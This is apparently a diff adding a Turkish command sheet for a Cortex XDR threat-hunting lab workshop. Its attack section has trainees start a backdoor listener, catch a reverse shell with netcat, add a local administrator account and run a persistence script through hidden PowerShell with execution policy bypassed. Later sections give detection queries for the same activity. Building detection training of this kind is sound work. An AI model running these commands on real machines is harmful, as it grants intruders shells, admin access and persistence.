@@ -1,0 +1,63 @@
+EO CORTEX XDR UTD WORKSHOP - HAZIR KOMUTLAR
+===========================================
+Komutlari kopyalayip ilgili makinedeki komut penceresine yapistirin.
+Lab rehberi: masaustundeki "UTD Lab Rehberi" kisayolu.
+
+ATTACKER masaustundeki "VICTIM-BILGISI.txt" dosyasinda kendi VICTIM makinenin
+IP'si ve hazir Client1.exe komutu yazilidir. IP aramayin, oradan kopyalayin.
+
+
+[Bolum 0] Makinenin hostname'i
+hostname
+
+[Bolum 0] (VICTIM) XDR agent servisi calisiyor mu
+Get-Service | Where-Object { $_.DisplayName -like "*Cortex*" }
+
+[Bolum 0] Kendi IP adresin (ATTACKER IP'si RevShell adiminda lazim)
+ipconfig | findstr IPv4
+
+
+[Bolum 1] (VICTIM) Backdoor listener'i baslat
+cd C:\x_test\server
+w_win.exe
+
+[Bolum 1] (VICTIM/ATTACKER) Dinlenen portlari gor (8000, 8001, 9999)
+netstat -nap tcp
+
+[Bolum 1] (ATTACKER) Victim'a baglan  -> IP icin VICTIM-BILGISI.txt
+cd C:\x_test\client
+Client1.exe <VICTIM-IP> localhost
+
+
+[Bolum 2] (ATTACKER) Netcat dinleyici (reverse shell icin)
+cd C:\x_test\client
+nc.exe -l -p 9999
+
+[Bolum 2] (reverse shell icinde) Dogru makinede miyiz
+hostname
+
+[Bolum 2] (reverse shell icinde) Local admin olustur
+net user /add newadmin Password123
+net localgroup administrators newadmin /add
+
+[Bolum 2] (reverse shell icinde) Persistency script'ini calistir
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\x_test\server\ud\persistency.ps1
+
+
+[Bolum 3] THREAT HUNTING - cmd'den powershell cagrisi (Query Builder > Process)
+NAME     = cmd.exe
+CMD     ~= powershell          (~ tilde = "icerir")
+HOST    = kendi VICTIM makinenin adi
+
+[Bolum 4] THREAT HUNTING - net user kullanimi (BIOC)
+NAME     = net.exe
+CMD     ~= user                (~ tilde = "icerir")
+HOST    = kendi VICTIM makinenin adi
+
+[Bolum 6] NETWORK SOURCE - malware'in indigi yer (Query Builder > File > Create)
+NAME     = index.html'deki malware dosya adi
+HOST    = kendi VICTIM makinenin adi
+
+[Bolum 7] DATA EXFILTRATION - w_win.exe'nin okudugu/olusturdugu dosyalar
+(Query Builder > File > Create + Read)
+Process NAME = w_win.exe
